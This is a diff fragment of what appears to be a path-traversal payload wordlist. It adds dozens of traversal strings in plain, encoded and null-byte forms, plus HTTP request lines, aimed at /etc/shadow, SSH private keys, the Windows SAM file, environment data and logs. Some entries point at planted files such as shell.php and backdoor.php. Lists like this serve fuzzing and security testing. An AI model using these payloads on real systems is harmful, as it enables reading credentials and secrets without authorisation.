@@ -17,11 +17,40 @@
 ..../..../..../..../etc/passwd
 ..../..../..../..../..../etc/passwd
 ..../..../..../..../..../..../etc/passwd
-..///etc/passwd
-..///..///etc/passwd
-..///...///..///etc/passwd
-..///...///..///..///etc/passwd
-..///..///..///..///..///etc/passwd
+../../../../etc/passwd
+../../../../etc/shadow
+../../../../etc/hosts
+../../../../proc/self/environ
+../../../../var/log/apache2/access.log
+../../../../var/log/nginx/access.log
+../../../../root/.ssh/id_rsa
+../../../../home/user/.bash_history
+..\..\..\Windows\win.ini
+..\..\..\Windows\System32\drivers\etc\hosts
+..\..\..\Windows\System32\config\SAM
+..\..\..\inetpub\wwwroot\web.config
+..%252f..%252f..%252f..%252fetc%252fpasswd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%252f..%252f..%252f..%252fWindows%252fwin.ini
+....//....//....//etc/passwd
+..////..////..////etc/passwd
+..%20/..%20/..%20/etc/passwd
+..%09/..%09/..%09/etc/passwd
+../../../../etc/passwd%00.jpg
+../../../../etc/passwd/././././././././././.
+../../../../var/www/html/shell.php
+../../../../tmp/malicious.sh
+../../../../root/.ssh/authorized_keys
+../../../../var/www/html/backdoor.php
+{"file": "../../../../../etc/passwd"}
+GET /bucket-a/../evil-bucket/secret.txt
+GET /static/link/%2e%2e/%2e%2e/etc/passwd
+GET /api/v1/explorer/open_file?file=../../../../etc/passwd
+GET /v1/app/readFileSync?path=../../../../etc/passwd
+../../../../proc/self/cmdline
+../../../../proc/self/status
+../../../../var/log/auth.log
 ..///..///..///..///..///..///etc/passwd
 ....////etc/passwd
 ....////....////etc/passwd
